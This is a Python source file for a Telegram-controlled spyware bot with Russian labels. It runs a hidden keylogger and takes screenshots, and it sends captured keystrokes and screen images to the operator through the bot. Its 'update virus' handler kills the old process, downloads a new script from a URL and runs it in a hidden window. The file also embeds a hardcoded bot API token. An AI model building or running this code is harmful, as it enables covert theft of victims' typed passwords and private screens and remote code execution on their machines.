
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from pynput import keyboard
from aiogram.client.default import DefaultBotProperties
from aiogram.types import FSInputFile
import asyncio
import logging
import pyautogui
import psutil
import os
import sys
import subprocess

FILENAME = "downloaded_script.py"

API_TOKEN = '7616913012:AAG7bTGW6KZFx0NHI7xi0l7je8exUPuRVdg'

logging.basicConfig(level=logging.INFO)

# Инициализация
bot = Bot(
    token=API_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()

# Хранилище клавиш
pressed_keys_log = []

# Обработка клавиш
def on_press(key):
    try:
        pressed_keys_log.append(str(key.char))
    except AttributeError:
        pressed_keys_log.append(str(key))

# Запуск слушателя клавиш
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Клавиатура
keyboard_markup = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="Скриншот и нажатия")],[KeyboardButton(text="Обновить вирус")]],
    resize_keyboard=True
)

@dp.message(CommandStart())
async def start_handler(message: Message):
    await message.answer("Получить лог и клавиши", reply_markup=keyboard_markup)

@dp.message(F.text.lower() == "скриншот и нажатия")
async def screenshot_and_keys(message: Message):
    # Скриншот
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)

    # Отправка изображения
    photo = FSInputFile(screenshot_path)
    await message.answer_photo(photo=photo, caption="Скриншот экрана")
    # Отправка лога
    if pressed_keys_log:
        last_keys = ''.join(pressed_keys_log[-50:])
        await message.answer(f"⌨️ Последние клавиши:\n<code>{last_keys}</code>")
    else:
        await message.answer("⌨️ Нет зафиксированных нажатий клавиш.")

@dp.message(F.text.lower() == "обновить вирус")
async def update_virus(message: Message):

    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if proc.info['name'] == "python.exe" and FILENAME in " ".join(proc.info['cmdline']):
                proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    try:
        if os.path.exists(FILENAME):
            os.remove(FILENAME)
        with urllib.request.urlopen(URL) as response:
            content = response.read()
        with open(FILENAME, "wb") as f:
            f.write(content)
        await message.answer("Скрипт генерации mac адресов скачан.")
    except Exception as e:
        await message.answer("Ошибка при скачивании cкрипта генерации mac адресов:", e)

    subprocess.Popen(
        [sys.executable, FILENAME],
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    
    
# Точка входа
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
